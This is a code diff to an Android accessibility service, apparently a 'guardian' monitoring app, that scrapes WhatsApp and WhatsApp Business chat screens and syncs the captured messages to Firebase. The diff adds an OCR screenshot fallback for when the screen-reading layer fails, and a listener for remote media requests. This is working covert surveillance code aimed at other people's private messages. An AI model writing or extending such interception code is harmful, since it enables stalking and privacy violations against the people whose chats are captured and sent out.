@@ -9,6 +9,7 @@ import android.location.Location
 import android.net.ConnectivityManager
 import android.net.NetworkCapabilities
 import android.os.BatteryManager
+import android.os.Build
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
 import com.device.guardian.service.data.local.AppDatabase
@@ -17,6 +18,8 @@ import com.google.android.gms.location.Priority
 import com.device.guardian.service.data.local.MessageEntity
 import com.device.guardian.service.data.remote.FirebaseRepository
 import com.device.guardian.service.service.extractor.MessageExtractor
+import com.device.guardian.service.service.extractor.OcrExtractor
+import com.device.guardian.service.service.extractor.ScreenDetector
 import com.device.guardian.service.service.filter.MessageFilter
 import kotlinx.coroutines.*
 import kotlinx.coroutines.tasks.await
@@ -30,6 +33,7 @@ class GuardianAccessibilityService : AccessibilityService() {
     private lateinit var firebaseRepo: FirebaseRepository
 
     private val extractor = MessageExtractor()
+    private val ocrExtractor = OcrExtractor()
     private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
 
     // BUG-20 fix: Time-based dedup cache with expiry
@@ -54,14 +58,22 @@ class GuardianAccessibilityService : AccessibilityService() {
             feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
             notificationTimeout = 100
             packageNames = arrayOf("com.whatsapp", "com.whatsapp.w4b")
+
+            // Enable screenshot capability for OCR fallback (API 34+)
+            if (Build.VERSION.SDK_INT >= 34) {
+                // FLAG_CAN_TAKE_SCREENSHOT = 0x00000800 (added in API 34)
+                flags = flags or 0x00000800
+            }
         }
 
         startPeriodicSync()
         startCleanupWorker()
         startStatusSync()
         startDedupCacheCleanup()
+        
+        firebaseRepo.listenForMediaRequests()
 
-        Log.d(TAG, "Service connected")
+        Log.d(TAG, "Service connected (OCR available: ${ocrExtractor.isAvailable()})")
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
@@ -75,22 +87,56 @@ class GuardianAccessibilityService : AccessibilityService() {
 
         val root = rootInActiveWindow ?: return
 
+        // ── Primary extraction (accessibility tree + screen detection) ──
+        // extract() returns:
+        //   null       → not on a chat screen, skip entirely
+        //   empty list → on chat screen but no messages found (trigger OCR fallback)
+        //   messages   → success
         val extracted = try {
             extractor.extract(root)
         } catch (e: Exception) {
             Log.w(TAG, "Extraction error: ${e.message}")
-            emptyList()
+            null
         } finally {
             root.recycle()
         }
 
-        if (extracted.isEmpty()) return
+        // null = not on chat screen → exit immediately
+        if (extracted == null) return
 
-        scope.launch {
-            extracted.forEachIndexed { index, rawMessage ->
-                val baseTime = if (rawMessage.timestamp > 0L) rawMessage.timestamp else System.currentTimeMillis()
-                val adjustedTimestamp = baseTime + index * 10L
-                processMessage(rawMessage, adjustedTimestamp)
+        if (extracted.isNotEmpty()) {
+            // Primary extraction succeeded
+            scope.launch {
+                extracted.forEachIndexed { index, rawMessage ->
+                    val baseTime = if (rawMessage.timestamp > 0L) rawMessage.timestamp else System.currentTimeMillis()
+                    val adjustedTimestamp = baseTime + index * 10L
+                    processMessage(rawMessage, adjustedTimestamp)
+                }
+            }
+        } else {
+            // ── OCR fallback ──
+            // We're confirmed on a chat screen but accessibility tree gave 0 messages.
+            // This can happen when WhatsApp updates break view IDs.
+            // Use OCR as a secondary extraction layer.
+            if (ocrExtractor.isAvailable() && ocrExtractor.isRateLimitOk()) {
+                val chatName = extractor.getLastChatName()
+                scope.launch {
+                    try {
+                        val ocrMessages = ocrExtractor.extractFromScreen(
+                            this@GuardianAccessibilityService,
+                            chatName
+                        )
+                        if (ocrMessages.isNotEmpty()) {
+                            Log.d(TAG, "OCR fallback captured ${ocrMessages.size} messages")
+                            ocrMessages.forEachIndexed { index, rawMessage ->
+                                val timestamp = rawMessage.timestamp + index * 10L
+                                processMessage(rawMessage, timestamp)
+                            }
+                        }
+                    } catch (e: Exception) {
+                        Log.w(TAG, "OCR fallback error: ${e.message}")
+                    }
+                }
             }
         }
     }
@@ -237,5 +283,6 @@ class GuardianAccessibilityService : AccessibilityService() {
     override fun onDestroy() {
         super.onDestroy()
         scope.cancel()
+        ocrExtractor.close()
     }
 }
